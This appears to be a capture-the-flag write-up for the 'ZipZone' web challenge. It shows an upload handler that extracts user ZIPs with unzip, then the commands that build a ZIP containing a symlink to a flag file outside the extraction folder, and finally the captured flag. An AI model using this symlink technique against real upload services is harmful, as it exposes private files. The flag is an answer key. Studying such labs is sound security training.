# ZipZone
## Description
> I was tired of trying to find a good file server for zip files, so I made my own! It's still a work in progress, but I think it's pretty good so far.
>
> https://zipzone-web.challs.csc.tf/

```py

    upload_uuid = str(uuid.uuid4())
    filename = f"{upload_dir}raw/{upload_uuid}.zip"
    file.save(filename)
    subprocess.call(["unzip", filename, "-d", f"{upload_dir}files/{upload_uuid}"])
    flash(
        f'Your file is at <a href="/files/{upload_uuid}">{upload_uuid}</a>!', "success"
    )
    logging.info(f"User uploaded file {upload_uuid}.")
    return redirect("/")
```
Creating a symbolic link (symlink) to ../../../tmp/flag.txt inside a ZIP file can be used as part of a ZIP Slip attack. The symlink itself doesn’t contain the actual data but points to a file outside the intended extraction directory. If a vulnerable application extracts the ZIP file and follows the symlink, it could access or manipulate files outside the target directory.

```
ln -s ../../../tmp/flag.txt itik
```
```
zip --symlinks itik.zip itik
```
When this ZIP file is extracted, a symlink named malicious_symlink will be created. If the application follows this symlink and reads or writes to it, it will actually be interacting with the file located at /tmp/flag.txt, potentially exposing sensitive information.

https://zipzone-web.challs.csc.tf/files/10b83902-3700-41bd-be67-a9bfac9aa712/itik
![image](https://github.com/user-attachments/assets/729d3fb8-2b7a-46a0-81d0-e6ec7390c518)
```
CSCTF{5yml1nk5_4r3_w31rd}
```
